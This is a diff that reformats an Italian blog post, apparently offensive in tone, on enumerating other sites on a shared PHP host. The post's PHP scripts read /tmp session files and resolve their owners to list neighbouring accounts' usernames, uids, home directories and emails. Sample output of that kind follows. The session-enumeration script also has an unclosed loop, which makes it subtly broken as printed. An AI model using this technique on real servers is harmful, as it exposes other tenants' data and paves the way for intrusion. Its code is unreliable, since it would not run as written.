@@ -10,11 +10,11 @@ Abbiamo parlato della /tmp, dei file di sessione e di come manipolarli per i nos
 
 Prima di tutto, sul nostro sito eseguiamo lo script che segue per determinare in che cartella ci troviamo:
 <pre>
-
-<div class="codecolorer-container text default" style="overflow:auto;white-space:nowrap;width:100%;height:100%;"><div class="text codecolorer">&nbsp; &nbsp; &amp;lt;?php<br />
-&nbsp; &nbsp; &nbsp; die(getcwd());<br />
-&nbsp; &nbsp; ?&amp;gt;</div></div>
-
+<code>
+&amp;lt;?php
+   die(getcwd());
+?&amp;gt;
+</code>
 </pre>
 
 <break>
@@ -22,26 +22,26 @@ Prima di tutto, sul nostro sito eseguiamo lo script che segue per determinare in
 Il che ci restituirà una stringa del tipo '/home/www/nostrosito.com' ... proviamo ora ad enumerare gli altri siti/utenti nella cartella /home/www come si farebbe normalmente in PHP:
 
 <pre>
-
-<div class="codecolorer-container text default" style="overflow:auto;white-space:nowrap;width:100%;height:100%;"><div class="text codecolorer">&amp;lt;?php<br />
-&nbsp; &nbsp; if ($handle = opendir('/home/www/')) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; while (false !== ($file = readdir($handle))) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($file != &quot;.&quot; &amp;amp;&amp;amp; $file != &quot;..&quot;) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo &quot;$file\n&quot;;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-&nbsp; &nbsp; &nbsp; &nbsp; closedir($handle);<br />
-&nbsp; &nbsp; }<br />
-?&amp;gt;</div></div>
-
+<code>
+&amp;lt;?php
+  if ($handle = opendir('/home/www/')) {
+    while (false !== ($file = readdir($handle))) {
+      if ($file != &quot;.&quot; &amp;amp;&amp;amp; $file != &quot;..&quot;) {
+        echo &quot;$file\n&quot;;
+      }
+    }
+    closedir($handle);
+  }
+?&amp;gt;
+</code>
 </pre>
 
 Ed indovinate un po? Ci troveremo davanti l'errore:
 
 <pre>
-
-<div class="codecolorer-container text default" style="overflow:auto;white-space:nowrap;width:100%;"><div class="text codecolorer">Warning: opendir(/home/www/) [function.opendir]: failed to open dir: Permission denied in /home/www/nostrosito.com/prova.php on line 5</div></div>
-
+<code>
+  Warning: opendir(/home/www/) [function.opendir]: failed to open dir: Permission denied in /home/www/nostrosito.com/prova.php on line 5
+</code>
 </pre>
 
 Uuuuuu che cattivoni! A noi quel Permission denied non piace per niente vero? :P
@@ -55,54 +55,54 @@ Bene! Sfruttiamo la /tmp ed i file di sessione nel seguente modo:
 </ul>
 Lo script è il seguente:
 <pre>
-
-<div class="codecolorer-container text default" style="overflow:auto;white-space:nowrap;width:100%;height:100%;"><div class="text codecolorer">&nbsp; &amp;lt;?php<br />
-&nbsp; &nbsp; $files = glob( &quot;/tmp/sess_*&quot; );<br />
-&nbsp; &nbsp; $users = array();<br />
-&nbsp; &nbsp; foreach( $files as $file ){<br />
-&nbsp; &nbsp; &nbsp; $owner = fileowner($file);<br />
-&nbsp; &nbsp; &nbsp; $user  = posix_getpwuid($owner);<br />
-&nbsp; &nbsp; &nbsp; if( !in_array( $user, $users ) ){<br />
-&nbsp; &nbsp; &nbsp; &nbsp; $users[] = $user;<br />
-&nbsp; &nbsp; &nbsp; }<br />
-&nbsp; &nbsp; &nbsp; <br />
-&nbsp; &nbsp; foreach( $users as $user ){<br />
-&nbsp; &nbsp; &nbsp; $info = str_replace( ' ', '&amp;amp;nbsp;', print_r($user,true) );<br />
-&nbsp; &nbsp; &nbsp; echo nl2br($info);<br />
-&nbsp; &nbsp; }<br />
-?&amp;gt;</div></div>
-
+<code>
+&amp;lt;?php
+  $files = glob( &quot;/tmp/sess_*&quot; );
+  $users = array();
+  foreach( $files as $file ){
+   $owner = fileowner($file);
+   $user  = posix_getpwuid($owner);
+   if( !in_array( $user, $users ) ){
+    $users[] = $user;
+   }
+   
+  foreach( $users as $user ){
+   $info = str_replace( ' ', '&amp;amp;nbsp;', print_r($user,true) );
+   echo nl2br($info);
+  }
+?&amp;gt;
+</code>
 </pre>
 
 Ed avremo la nostra bella lista, del tipo:
 <pre>
+<code>
+Array
+ (
+  [name] =&amp;gt; pierino.it
+  [passwd] =&amp;gt; *
+  [uid] =&amp;gt; 52417
+  [gid] =&amp;gt; 52417
+  [gecos] =&amp;gt; pierino.it@pierino.it
+  &lt;strong&gt; [dir] =&amp;gt; /home/www/pierino.it &lt;/strong&gt;
+  [shell] =&amp;gt; /bin/true
+ )
 
-<div class="codecolorer-container text default" style="overflow:auto;white-space:nowrap;width:100%;height:100%;"><div class="text codecolorer">&nbsp; Array<br />
-&nbsp; (<br />
-&nbsp; &nbsp; [name] =&amp;gt; pierino.it<br />
-&nbsp; &nbsp; [passwd] =&amp;gt; *<br />
-&nbsp; &nbsp; [uid] =&amp;gt; 52417<br />
-&nbsp; &nbsp; [gid] =&amp;gt; 52417<br />
-&nbsp; &nbsp; [gecos] =&amp;gt; pierino.it@pierino.it<br />
-&nbsp; &nbsp; &lt;strong&gt; [dir] =&amp;gt; /home/www/pierino.it &lt;/strong&gt;<br />
-&nbsp; &nbsp; [shell] =&amp;gt; /bin/true<br />
-&nbsp; )<br />
-<br />
-&nbsp; Array<br />
-&nbsp; (<br />
-&nbsp; &nbsp; [name] =&amp;gt; foobar.com<br />
-&nbsp; &nbsp; [passwd] =&amp;gt; *<br />
-&nbsp; &nbsp; [uid] =&amp;gt; 61240<br />
-&nbsp; &nbsp; [gid] =&amp;gt; 61240<br />
-&nbsp; &nbsp; [gecos] =&amp;gt; foobar.com@foobar.com<br />
-&nbsp; &nbsp; &lt;strong&gt; [dir] =&amp;gt; /home/www/foobar.com &lt;/strong&gt;<br />
-&nbsp; &nbsp; [shell] =&amp;gt; /bin/true<br />
-&nbsp; )<br />
-<br />
-&nbsp; ...</div></div>
+ Array
+ (
+  [name] =&amp;gt; foobar.com
+  [passwd] =&amp;gt; *
+  [uid] =&amp;gt; 61240
+  [gid] =&amp;gt; 61240
+  [gecos] =&amp;gt; foobar.com@foobar.com
+  &lt;strong&gt; [dir] =&amp;gt; /home/www/foobar.com &lt;/strong&gt;
+  [shell] =&amp;gt; /bin/true
+ )
 
+ ...
+</code>
 </pre>
 
 Bingoooo, ecco la lista degli utenti apache e delle rispettive home directory / htdocs (cazzio pure le email :D) ... come si diceva?
-<br>
+<br/>
 <p style="text-align: center;"><strong>My Kung Fu Is Stronger Than Yours!!!!!</strong></p>
